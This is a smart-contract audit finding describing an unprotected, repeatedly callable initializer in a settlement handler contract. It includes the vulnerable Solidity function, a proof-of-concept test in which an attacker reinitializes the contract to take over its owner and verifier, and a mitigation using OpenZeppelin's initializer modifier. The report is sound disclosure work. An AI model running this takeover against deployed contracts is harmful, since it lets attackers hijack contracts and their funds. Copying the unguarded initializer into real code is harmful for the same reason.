# Vulnerability details

## Description
The BaseSettlementHandler contract contains an initialization function _Settlement_handler_init that lacks protection against multiple calls/ multiple initialization. The function sets critical contract parameters but can be called repeatedly, allowing an attacker to override essential contract state.
Vulnerable code snippet:
```
function _Settlement_handler_init(
    address _owner,
    SettlementMode _mode,
    address _token,
    address _verifier,
    string memory _chain,
    address _settlement
) public {
    __Ownable_init(_owner);
    __UUPSUpgradeable_init();
    settlement = ISettlement(_settlement);
    verifier = ISettlementSignatureVerifier(_verifier);
    mode = _mode;
    token = _token;
    chain = _chain;
}
```


## Impact
An attacker can repeatedly call this function to modify the existing state and reinitialize the contract multiple times.

The provided PoC demonstrates this vulnerability:

Here is the test function
```
    function testReinitializationVulnerability() public {
        // Initial setup
        handler._Settlement_handler_init(
            owner,
            BaseSettlementHandler.SettlementMode.MintBurn,
            mockToken,
            mockVerifier,
            "Chain1",
            mockSettlement
        );
        
        emit log_named_address("Initial token", handler.token());
        emit log_named_uint("Initial mode", uint(handler.mode()));
        emit log_string(string(abi.encodePacked("Initial chain: ", handler.chain())));

        // Attacker reinitializes with different values
        address attackerToken = address(0x6);
        handler._Settlement_handler_init(
            attacker,
            BaseSettlementHandler.SettlementMode.LockUnlock,
            attackerToken,
            attacker,
            "AttackerChain",
            attacker
        );

        emit log_named_address("Reinitialized token", handler.token());
        emit log_named_uint("Reinitialized mode", uint(handler.mode()));
        emit log_string(string(abi.encodePacked("Reinitialized chain: ", handler.chain())));

        // Assert the changes
        assertEq(handler.token(), attackerToken, "Token should be changed");
        assertEq(uint(handler.mode()), uint(BaseSettlementHandler.SettlementMode.LockUnlock), "Mode should be changed");
        assertEq(handler.chain(), "AttackerChain", "Chain should be changed");
        assertEq(address(handler.verifier()), attacker, "Verifier should be changed");
        assertEq(address(handler.settlement()), attacker, "Settlement should be changed");
    }
```

## Recommended Mitigation Steps
Use the initializer modifier from OpenZeppelin's Initializable contract. This is the recommended approach for securing initialization functions in upgradeable contracts.
